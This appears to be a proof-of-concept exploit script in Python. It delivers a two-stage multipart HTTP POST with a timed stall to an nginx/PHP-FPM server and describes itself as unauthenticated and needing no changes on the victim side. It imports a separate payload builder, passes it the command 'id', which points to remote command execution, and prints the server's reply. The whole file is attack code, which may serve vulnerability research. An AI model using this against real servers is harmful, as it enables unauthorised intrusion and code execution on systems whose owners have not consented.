#!/usr/bin/env python3
"""Staged HTTP sender: exact poc0 shape against the real nginx->fpm stack.
Unauthenticated, external path, zero victim modifications."""
import argparse
import socket
import sys
import time

sys.path.insert(0, "/tmp/opencode/realapps/side")
from staged_618 import build  # noqa: E402  (our own re-implementation)


def send(host: str, port: int, path: str, phase1: bytes, tail: bytes,
         sid: str, stall: float) -> bytes:
    body_len = len(phase1) + len(tail)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: staged-poc618\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary=B7kQpoc618\r\n"
        f"Content-Length: {body_len}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = socket.create_connection((host, port), timeout=40)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.sendall(head + phase1)
    time.sleep(stall)
    s.sendall(tail)
    s.settimeout(20)
    chunks = []
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        chunks.append(d)
    s.close()
    return b"".join(chunks)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--path", default="/")
    ap.add_argument("--sid", required=True)
    ap.add_argument("--stall", type=float, default=1.35)
    a = ap.parse_args()
    phase1, tail = build(a.sid, b"id", 0)
    t0 = time.time()
    try:
        resp = send(a.host, a.port, a.path, phase1, tail, a.sid, a.stall)
        line = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        print(f"reply={line} bytes={len(resp)} dt={time.time()-t0:.2f}s")
    except Exception as e:
        print(f"ERROR {type(e).__name__}: {e} dt={time.time()-t0:.2f}s")


if __name__ == "__main__":
    main()
